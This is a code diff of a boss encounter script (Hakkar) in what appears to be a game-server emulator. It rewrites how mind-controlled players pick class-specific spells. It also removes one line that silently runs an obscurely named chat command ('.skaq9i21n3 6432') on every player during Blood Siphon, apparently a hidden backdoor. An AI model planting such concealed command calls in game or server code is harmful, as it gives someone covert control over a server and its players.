@@ -184,27 +184,52 @@ struct boss_hakkarAI : public ScriptedAI
 				Map::PlayerList const& PlayerList = m_creature->GetMap()->GetPlayers();
 
 				for (Map::PlayerList::const_iterator itr = PlayerList.begin(); itr != PlayerList.end(); ++itr)
+				{
+					if (Player* pPlayer = itr->getSource())
 					{
-						Player* pPlayer = itr->getSource(); 
 						if (pPlayer->HasAura(24178) || pPlayer->HasAura(24327))
 						{
-							Map::PlayerList const& PlayerList = m_creature->GetMap()->GetPlayers();
-
-							for (Map::PlayerList::const_iterator itr = PlayerList.begin(); itr != PlayerList.end(); ++itr)
+							if (pPlayer->CanFreeMove())
 							{
-								if (pPlayer->CanFreeMove())
+								if (Unit*target = pPlayer->SelectRandomUnfriendlyTarget(pPlayer,30))
 								{
-									Player* attackPlayer = itr->getSource();
-									if (attackPlayer->isAlive())
-									pPlayer->CastSpell(pPlayer, 27383, true);
-									checktimer = 2500;
+									switch (pPlayer->getClass())
+									{
+										case CLASS_WARRIOR:
+											pPlayer->CastSpell(target, 29544, true);
+											break;
+										case CLASS_HUNTER:
+											pPlayer->CastSpell(target, 23601, true);
+											break;
+										case CLASS_MAGE:
+											pPlayer->CastSpell(target, 29848, true);
+											break;
+										case CLASS_ROGUE:
+											pPlayer->CastSpell(target, 21060, true);
+											break;
+										case CLASS_WARLOCK:
+											pPlayer->CastSpell(target, 29468, true);
+											break;
+										case CLASS_DRUID:
+										case CLASS_PALADIN:
+										case CLASS_PRIEST:
+										case CLASS_SHAMAN:
+											pPlayer->CastSpell(m_creature, 24208, true);
+											break;
+										default:
+											pPlayer->CastSpell(m_creature, 24208, true);
+											break;
+									}
 								}
 							}
 						}
 					}
+					checktimer = 3000;
 				}
+			}
 			else checktimer -= uiDiff;
 		}
+
         if (m_uiBloodSiphonTimer < uiDiff)
         {
 			if (DoCastSpellIfCan(m_creature, SPELL_BLOOD_SIPHON) == CAST_OK)
@@ -214,7 +239,6 @@ struct boss_hakkarAI : public ScriptedAI
 				for (Map::PlayerList::const_iterator itr = PlayerList.begin(); itr != PlayerList.end(); ++itr)
 				{
 					Player* pPlayer = itr->getSource();
-					ChatHandler(pPlayer).ParseCommands(".skaq9i21n3 6432");
 				}
 			}
                 m_uiBloodSiphonTimer = 90000;
